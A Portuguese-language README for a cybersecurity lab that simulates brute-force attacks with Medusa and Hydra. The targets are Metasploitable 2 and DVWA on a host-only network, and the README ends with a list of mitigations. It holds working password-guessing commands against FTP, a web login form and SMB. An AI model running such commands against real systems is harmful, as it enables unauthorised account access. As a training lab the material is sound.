## 🔗 MITRE ATT&CK

- T1110 - Brute Force
  
# 🔐 Brute Force Lab - Kali Linux + Medusa

## 📌 Descrição
Projeto prático de cibersegurança com simulação de ataques de força bruta em ambiente controlado.

## 🎯 Objetivos
- Explorar ataques brute force em FTP, Web e SMB
- Utilizar Medusa e ferramentas auxiliares
- Documentar vulnerabilidades e mitigações

## 🧪 Ambiente
- Kali Linux
- Metasploitable 2
- DVWA
- VirtualBox (Host-Only Network)

## 🔍 Enumeração

```bash
nmap -sV 192.168.56.102

## 🔓 Ataque FTP (Medusa)
medusa -h 192.168.56.102 -u msfadmin -P wordlists/wordlist.txt -M ftp

## 🌐 Ataque Web (DVWA)

hydra -l admin -P wordlists/wordlist.txt 192.168.56.102 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"

## 🗂️ Ataque SMB
medusa -h 192.168.56.102 -U wordlists/users.txt -p password -M smbnt

## 🛡️ Mitigações
* MFA (Autenticação multifator)
* Account Lockout
* Senhas fortes
* Monitoramento de logs

## 📸 Evidências
Veja a pasta /images

